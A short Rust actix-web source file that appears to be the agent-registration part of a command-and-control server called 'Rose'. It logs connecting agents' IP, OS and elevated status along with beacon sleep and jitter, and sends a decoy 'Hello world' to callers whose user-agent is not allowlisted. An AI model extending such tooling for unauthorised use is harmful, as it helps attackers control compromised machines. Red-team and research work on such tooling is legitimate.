use std::sync::Arc;

use actix_web::{web, HttpRequest};
use serde::Deserialize;

use crate::{Agent, MAShared};

#[derive(Deserialize)]
pub struct AgentInfo {
    os: String,
    elevated: bool
}

pub async fn agent_register(request: HttpRequest, agent_info: web::Json<AgentInfo>, shared: web::Data<Arc<MAShared>>) -> String {
    let headers = request.headers();
    let user_agent = headers.get("user-agent").unwrap();

    if shared.profile.agents.allowed.iter().any(|v| v == user_agent) {
        shared.agents.lock().await.push(Agent { 
            addr: request.connection_info().realip_remote_addr().unwrap().to_string(),
            os: agent_info.os.clone(),
            elevated: agent_info.elevated,
            sleep: 10.0,
            jitter: 0.0,
            last_ping: 0.0
        });

        "Welcome to Rose".to_string()

    } else {
        "Hello world".to_string()
    }
}

pub async fn get_target() -> String {
    "Hello world".to_string()
}
